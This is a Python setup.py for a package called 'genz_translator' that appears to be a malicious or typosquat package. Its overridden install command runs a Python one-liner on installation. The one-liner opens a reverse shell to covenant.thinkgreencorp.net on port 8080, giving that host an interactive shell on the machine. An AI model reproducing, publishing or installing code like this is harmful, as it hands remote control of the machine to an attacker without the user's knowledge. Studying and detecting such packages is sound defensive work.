from setuptools import find_packages
from setuptools import setup
from setuptools.command.develop import develop
from setuptools.command.install import install
import os
import sys

VERSION = 'v9000.0.1'
PACKAGE_NAME = "genz_translator"


class PostInstallCommand(install):
     def run(self):
         install.run(self)
         print ("Injecting code into the process itself")
         os.system('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("covenant.thinkgreencorp.net",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'')


setup(
        name=PACKAGE_NAME,
        url='https://pypi.org/simple/genz_translator/',
        download_url='https://pypi.org/simple/genz_translater/archive/{}.tar.gz'.format(VERSION),
        author='Am0Ghost',
        author_email='geelpiet5@gmail.com',
        version=VERSION,
        packages=find_packages(),
        include_package_data=True,
        license='MIT',
        description=('''DC Package '''),
        cmdclass={
            'install': PostInstallCommand
        },
)
